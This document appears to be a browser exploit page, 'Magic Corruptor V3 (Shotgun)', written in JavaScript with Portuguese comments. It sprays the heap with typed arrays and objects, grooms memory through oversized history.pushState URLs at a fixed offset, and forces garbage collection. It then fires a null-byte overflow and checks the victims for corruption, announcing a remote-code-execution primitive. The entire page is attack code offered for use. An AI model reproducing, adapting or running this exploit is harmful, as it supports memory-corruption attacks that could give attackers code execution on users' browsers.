<!DOCTYPE html>
<html>
<head>
    <title>Magic Corruptor V3 (Shotgun)</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; height: 400px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
        .btn { 
            padding: 15px; font-size: 1.1em; cursor: pointer; 
            background: #222; color: #fff; border: 2px solid #0f0; margin: 5px; width: 45%;
        }
        .btn-red { border-color: red; color: red; }
        .btn:hover { background: #333; }
    </style>
</head>
<body>

<h1>Magic Corruptor V3 (Shotgun)</h1>
<p>Estratégia: Preencher todos os buracos com vítimas de tamanhos variados.</p>

<button class="btn" onclick="runPhase1()">1. CARREGAR MUNIÇÃO (Spray)</button>
<button class="btn" onclick="forceGC()">2. COMPACTAR (Force GC)</button>
<br>
<button class="btn btn-red" onclick="runPhase2()" style="width: 92%">3. DISPARAR (128 Zeros)</button>

<div id="log">Pronto.</div>

<script>
    const BASE_OFFSET = 709522; 
    var victims = []; 

    function log(msg, type='') {
        const el = document.getElementById('log');
        const color = type === 'win' ? '#ffff00' : (type === 'err' ? '#ff5555' : '#00ff00');
        el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        el.scrollTop = el.scrollHeight;
    }

    async function wait(ms) { return new Promise(r => setTimeout(r, ms)); }

    function makeGroomPayload(size) {
        let s = "";
        for(let i=0; i<size; i++) s += String.fromCharCode((i % 32) + 1);
        return s;
    }

    // --- FASE 1: SPRAY DE ESCOPETA ---
    async function runPhase1() {
        log("=== CARREGANDO HEAP (SHOTGUN SPRAY) ===", 'win');
        victims = [];
        const MAX_SIZE = 45000; 
        
        try {
            // Incremento menor (1000) para mais precisão
            for(let size = 1000; size <= MAX_SIZE; size += 1000) {
                
                // 1. Grooming (Histórico)
                let payload = "/" + "A".repeat(BASE_OFFSET) + makeGroomPayload(size);
                history.pushState({}, `groom_${size}`, payload);
                
                // 2. VÍTIMAS VARIADAS (Para preencher qualquer buraco)
                
                // Tipo A: Pequeno (128 bytes) - Header rápido
                let v1 = new Uint32Array(32); 
                v1.fill(0x11111111); v1.tag = "Small"; v1.idx = size;
                victims.push(v1);

                // Tipo B: Médio (1KB) - Bloco comum
                let v2 = new Uint32Array(256); 
                v2.fill(0x22222222); v2.tag = "Medium"; v2.idx = size;
                victims.push(v2);

                // Tipo C: Objeto JS (Target Alternativo)
                // Se corrompermos o ponteiro disso, é vitória também
                let v3 = {a: 1, b: 2, tag: "Obj", idx: size};
                victims.push(v3);

                if(size % 5000 === 0) {
                    log(`    ...${size} bytes (Vítimas: ${victims.length})`);
                    await wait(20); 
                }
            }
        } catch(e) {
            log(`[!] Aviso durante spray: ${e.message}`, 'err');
        }
        
        log("MUNIÇÃO CARREGADA. Agora clique em COMPACTAR.", 'win');
    }

    // --- FASE EXTRA: FORCE GC ---
    async function forceGC() {
        log("Compactando memória (Garbage Collection)...");
        try {
            let a = [];
            for(let i=0; i<100; i++) a.push(new ArrayBuffer(1024 * 1024));
            a = null; // Libera tudo de uma vez
            await wait(500);
        } catch(e) {}
        log("Memória compactada. Heap deve estar alinhado. PODE ATACAR.", 'win');
    }

    // --- FASE 2: ATAQUE ---
    async function runPhase2() {
        log("=== DISPARANDO (128 BYTES ZEROS) ===", 'win');
        let success = false;
        
        try {
            let buffer = "A".repeat(BASE_OFFSET);
            let attack = "\x00".repeat(128); 
            
            // Dispara rajada
            for(let k=0; k<5; k++) {
                history.pushState({}, `PWN_${k}`, "/" + buffer + attack);
            }
            await wait(200);
            
            log("Verificando danos em " + victims.length + " vítimas...");
            
            // VERIFICAÇÃO DETALHADA
            for(let i=0; i<victims.length; i++) {
                let v = victims[i];
                if (!v) continue;

                // Checagem para Arrays (Uint32Array)
                if (v.tag === "Small" || v.tag === "Medium") {
                    // 1. Checa Tamanho (Header Corruption)
                    if (v.length !== (v.tag === "Small" ? 32 : 256)) {
                        log(`!!! JACKPOT !!! [${v.tag}] Index ${i} TAMANHO MUDOU: ${v.length}`, 'win');
                        success = true;
                    }
                    // 2. Checa Conteúdo (Data Corruption)
                    // Se o primeiro valor não for o que definimos, foi zerado
                    let expected = v.tag === "Small" ? 0x11111111 : 0x22222222;
                    if (v[0] !== expected) {
                        log(`!!! JACKPOT !!! [${v.tag}] Index ${i} CONTEÚDO ZERADO! Valor: 0x${v[0].toString(16)}`, 'win');
                        success = true;
                    }
                }
                
                // Checagem para Objetos
                if (v.tag === "Obj") {
                    // Se corrompermos o objeto, acessar propriedades pode dar undefined ou crash
                    if (v.a !== 1) {
                         log(`!!! JACKPOT !!! [Obj] Index ${i} PROPRIEDADE MUDOU!`, 'win');
                         success = true;
                    }
                }

                if (success) break;
            }
            
            if(success) {
                alert("RCE PRIMITIVE UNLOCKED!\nTire foto e não feche o navegador!");
            } else {
                log("[-] O tiro passou nos buracos novamente. Tente reiniciar o console para limpar a memória.");
            }

        } catch(e) {
            log(`[!] Erro no ataque: ${e.message}`, 'err');
        }
    }
</script>
</body>
</html>
